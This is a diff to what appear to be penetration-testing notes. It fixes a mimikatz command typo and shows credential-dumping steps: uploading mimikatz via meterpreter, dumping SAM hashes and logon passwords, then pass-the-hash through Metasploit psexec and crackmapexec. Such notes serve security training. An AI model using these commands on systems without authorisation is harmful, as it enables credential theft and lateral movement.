@@ -151,7 +151,7 @@ that is a part of the local administrators group on the Windows target system
 	   `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
 	   `shell`
 	   `.\mimikatz.exe`
-	   `prvilege::debug` -- if gives Privilege '20' ok then you have required privilege in order to perform hash extraction from memory
+	   `privilege::debug` -- if gives Privilege '20' ok then you have required privilege in order to perform hash extraction from memory
 	   `lsadump::sam`
 	   `sekurlsa::logonpasswords`
 
@@ -162,7 +162,7 @@ that is a part of the local administrators group on the Windows target system
 	- `LPORT 4422` -- different from meterpreter session
 	- `set RHOST [target IP]`
 	- `set SMBUser [username]`
-	- `set SMBPass [LM:NT for the user]`
+	- `set SMBPass [LM:NT for the user or normal password]`
 	- `set target Native\ upload`
 - Using crackmapexec 
 	- `crackmapexec smb [IP] -u [USERNAME] -H "[NT hash]"` -- -H for hash
